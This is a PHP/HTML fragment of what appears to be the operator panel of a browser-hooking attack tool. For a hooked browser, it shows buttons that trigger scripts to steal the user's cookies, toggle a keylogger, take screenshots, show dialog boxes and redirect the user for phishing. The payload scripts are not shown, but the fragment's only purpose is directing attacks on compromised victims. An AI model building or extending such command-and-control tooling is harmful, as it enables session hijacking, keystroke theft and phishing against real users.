<script src="js/utils.js"></script>
<table class="table table-bordered table-striped table-condensed">
    <thead>
        <tr>
            <th class="text-center">Gathering Information</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>
                <?php
                    echo '<a href="#" onclick="javascript:commandPopUp(\'commands/gatheringInformation/stealCookies.php?browserId=' . htmlspecialchars($_GET['browserId']) . '\' , 300, 500);return false;"><img src="img/commands/stealcookies.png" width="32" height="32" title="Steal user cookies"></a>';
                    echo '<a href="#" onclick="javascript:commandPopUp(\'commands/gatheringInformation/keylogger.php?browserId=' . htmlspecialchars($_GET['browserId']) . '\' , 300, 500);return false;"><img src="img/commands/keylogger.png" width="32" height="32" title="Enable/disable keylogger"></a>';
                    echo '<a href="#" onclick="javascript:commandPopUp(\'commands/gatheringInformation/takeScreenshot.php?browserId=' . htmlspecialchars($_GET['browserId']) . '\' , 300, 500);return false;"><img src="img/commands/takescreenshot.png" width="32" height="32" title="Take screenshot"></a>';
                ?>
                </td>
        </tr>
    </tbody>
</table>
<table class="table table-bordered table-striped table-condensed">
    <thead>
        <tr>
            <th class="text-center">User Interaction</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>
                <?php
                    echo '<a href="#" onclick="javascript:commandPopUp(\'commands/userInteraction/displayDialogBox.php?browserId=' . htmlspecialchars($_GET['browserId']) . '\' , 300, 500);return false;"><img src="img/commands/dialogBox.png" width="32" height="32" title="Display dialog box"></a>';
                ?>
            </td>
        </tr>
    </tbody>
</table>
<table class="table table-bordered table-striped table-condensed">
    <thead>
        <tr>
            <th class="text-center">Phishing</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>
                <?php
                    echo '<a href="#" onclick="javascript:commandPopUp(\'commands/phishing/redirect.php?browserId=' . htmlspecialchars($_GET['browserId']) . '\' , 300, 500);return false;"><img src="img/commands/redirect.png" width="32" height="32" title="Redirect user"></a>';
                ?>
            </td>
        </tr>
    </tbody>
</table>